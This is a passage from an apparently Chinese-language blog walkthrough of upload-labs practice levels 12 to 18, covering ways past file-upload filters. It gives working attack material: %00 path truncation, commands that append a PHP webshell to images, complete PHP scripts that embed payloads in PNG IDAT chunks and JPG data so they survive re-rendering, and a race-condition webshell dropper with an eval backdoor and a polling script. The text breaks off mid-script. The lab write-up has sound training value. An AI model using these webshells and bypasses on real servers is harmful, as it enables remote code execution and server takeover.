class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现此关限制了上传的文件名后缀只能为<code>&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;</code>，故为白名单过滤。同时还给了一个<code>save_path</code>参数需要我们进行GET传参，即上传路径可控。最终文件的存放位置是以拼接的方式，可以使用%00截断。原理：php的一些函数的底层是C语言，而<code>move_uploaded_file</code>就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407220102415.png" alt="image-20240722010252303"></p><p>由于我的phpstudy的原因（php版本过高）而不能复现，故只讲解法。上传shell.php文件，在<code>/upload/</code>后面接上<code>shell.php%00</code>，并将上传的文件名改为shell.jpg，这样拼接时遇到<code>%00</code>就会截断，事实上只解析了shell.php而没有后面一部分，故蚁剑连接的时候也只用输入到shell.php即可</p><h4 id="pass-13（POST-0x00截断）"><a href="#pass-13（POST-0x00截断）" class="headerlink" title="pass-13（POST 0x00截断）"></a>pass-13（POST 0x00截断）</h4><p>PHP环境要求同<strong>pass-12</strong>，与上一关不同的点就在于此关是post传参控制上传路径，解题方法类似</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407221120341.png" alt="1721618379467"></p><p>注意shell.php后面是有一个%00的，由于在post传参里面，需要进行URL decode，bp里面进行URL decode只需选中要解码的内容，右键选择<code>Convert selection</code>——<code>URL</code>——<code>URL-decode</code>，用蚁剑连接的时候只需把文件名写到shell.php就行了</p><h4 id="pass-14（图片码）"><a href="#pass-14（图片码）" class="headerlink" title="pass-14（图片码）"></a>pass-14（图片码）</h4><p>本关要求上传图片码，图片码制作如下</p><p><strong>Linux：</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat shell.php &gt;&gt; shell.jpg</span><br></pre></td></tr></table></figure><p><strong>shell.php</strong>是一句话木马，<strong>shell.jpg</strong>是正常的图片，执行后<code>cat shell.jpg</code>查看<strong>shell.jpg</strong>可以发现一句话木马写到了图片后面</p><p><strong>windows:</strong></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.jpg/b + <span class="number">1</span>.php/a <span class="number">2</span>.jpg  </span><br></pre></td></tr></table></figure><p><strong>1.jpg</strong>是正常图片，<strong>1.php</strong>是一句话木马，<strong>2.jpg</strong>是制作的图片码<br>制作完成之后就可以直接上传了</p><p>上传之后，可以通过GET传参搭配文件包含漏洞来测试是否上传成功</p><h4 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h4><p>本关同<strong>pass-14</strong></p><h4 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h4><p>本关同<strong>pass-14</strong>和<strong>pass-15</strong>，但是需要打开php_exif</p><h4 id="pass-17（二次渲染）"><a href="#pass-17（二次渲染）" class="headerlink" title="pass-17（二次渲染）"></a>pass-17（二次渲染）</h4><p><strong>二次渲染原理：</strong><br>在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。</p><p><strong>二次渲染绕过：</strong></p><ol><li>配合文件包含漏洞：<br>将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell。</li><li>配合条件竞争：<br>这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传。</li></ol><p>这里先介绍结合文件包含漏洞绕过，包括<strong>gif</strong>文件、<strong>jpg</strong>文件、<strong>png</strong>文件绕过</p><h5 id="GIF文件绕过"><a href="#GIF文件绕过" class="headerlink" title="GIF文件绕过"></a>GIF文件绕过</h5><p>先制作gif图片码，上传到靶场</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407241809406.png" alt="image-20240724180939189"></p><p>右键图片，新页面查看并另存到电脑里面，打开<code>010editor</code>工具打开下载的图片和图片码比较哪部分没有改变(顶部选择工具—比较文件)<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407241812614.png" alt="image-20240724181208300"></p><p>选中匹配，十六进制中蓝色部分即为匹配的地方，也就是二次渲染没有进行更新的地方，我们在这里插入一句话木马，并保存图片。重复上面的操作，上传之后再下载对比看看木马是否还存在。<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407241917642.png" alt="image-20240724191735308"></p><p>木马还在，接着结合文件包含漏洞用蚁剑连接即可</p><h5 id="PNG文件绕过"><a href="#PNG文件绕过" class="headerlink" title="PNG文件绕过"></a>PNG文件绕过</h5><p>尝试和gif一样的手法绕过，对比下来发现只有png文件头是一样的，如果修改这一部分则会导致文件不是png文件，所以要另寻他法。<br>先介绍一下相关知识：</p><p><strong>png图片格式组成</strong>：</p><p>png图片由3个以上的数据块组成.</p><p>png定义了两种类型的数据块，一种是称为**关键数据块(critical chunk)<strong>，这是标准的数据块，另一种叫做</strong>辅助数据块(ancillary chunks)<strong>，这是可选的数据块。<br>关键数据块定义了3个标准数据块</strong>(IHDR,IDAT, IEND)**，每个PNG文件都必须包含它们：</p><p><strong>IHDR</strong></p><p>数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p><p><strong>PLTE</strong></p><p>调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4&#x3D;16），否则，这将导致PNG图像不合法。</p><p><strong>IDAT</strong></p><p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像</p><p><strong>IEND</strong></p><p>图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p><p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p><p>00 00 00 00 49 45 4E 44 AE 42 60 82</p><p>有两种方法写入php代码：</p><h6 id="1、写入PLTE模块"><a href="#1、写入PLTE模块" class="headerlink" title="1、写入PLTE模块"></a>1、写入PLTE模块</h6><p>写入 PLTE 数据块并不是对所有的 PNG 图片都是可行的，只有索引图像才可以成功插入 payload。附上payload图片：<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407242145860.png" alt="webshell"></p><p>蚁剑的连接密码为1</p><h6 id="2、写入IDAT模块"><a href="#2、写入IDAT模块" class="headerlink" title="2、写入IDAT模块"></a>2、写入IDAT模块</h6><p>运行php脚本如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php IDAT_PNG.php shell.png</span><br></pre></td></tr></table></figure><p><code>IDAT_PNG.php</code>是脚本名称，<code>shell.png</code>是一张png后缀的图片，运行后会生成一个<code>1.png</code>的文件，用<code>010editor</code>查看<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407251047952.png" alt="image-20240725104741788"></p><p>发现木马已经被写入，对0进行GET传参，对1进行POST传参。例如GET:?0&#x3D;system POST:1&#x3D;whoami，用hackbar传参<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407251116318.png" alt="image-20240725111629082"></p><p>发现命令执行成功</p><h5 id="JPG文件绕过"><a href="#JPG文件绕过" class="headerlink" title="JPG文件绕过"></a>JPG文件绕过</h5><p>直接上脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用方法：先上传一张jpg图片到靶场，再下载渲染后的照片命名为<code>1.jpg</code>，运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php jpg_payload.php 1.jpg</span><br></pre></td></tr></table></figure><p>就可以得到payload的jpg图片了，但是需要多次尝试，因为有的jpg图片不能被修改</p><h4 id="pass-18（条件竞争）"><a href="#pass-18（条件竞争）" class="headerlink" title="pass-18（条件竞争）"></a>pass-18（条件竞争）</h4><p><strong>条件竞争原理：</strong></p><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p><p>上传文件源代码里没有校验上传的文件，文件直接上传，上传成功后才进行判断：如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除。<br>由于服务器并发处理(同时)多个请求，假如a用户上传了木马文件，由于代码执行需要时间，在此过程中b用户访问了a用户上传的文件，会有以下三种情况：<br>  1.访问时间点在上传成功之前，没有此文件。<br>  2.访问时间点在刚上传成功但还没有进行判断，该文件存在。<br>  3.访问时间点在判断之后，文件被删除，没有此文件。<br><strong>条件竞争绕过：</strong></p><p>修改木马如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;a.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个木马会生成在后台生成一个一句话木马<code>a.php</code>，接下来我们要并发的去访问这个文件，需要用bp一直去发包，然后利用python脚本去监听是否访问到了该文件。bp发包如下：</p><p>先抓包，然后右键送到<code>Intruder</code>模块，然后<code>clear $</code><br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407252217368.png" alt="image-20240725221743994"></p><p>选择<strong>payload type</strong>为<code>Null payloads</code>，同时将<strong>payload setting</strong>选为<code>continue indefinitely</code><br>接着运行python脚本，xxx表示自己的靶场地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://xxx.xxx.xxx.xx/upload-labs/upload/shell.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> ( <span class="string">&#x27;Warning&#x27;</span>  <span class="keyword">not</span> <span class="keyword">in</span>  <span 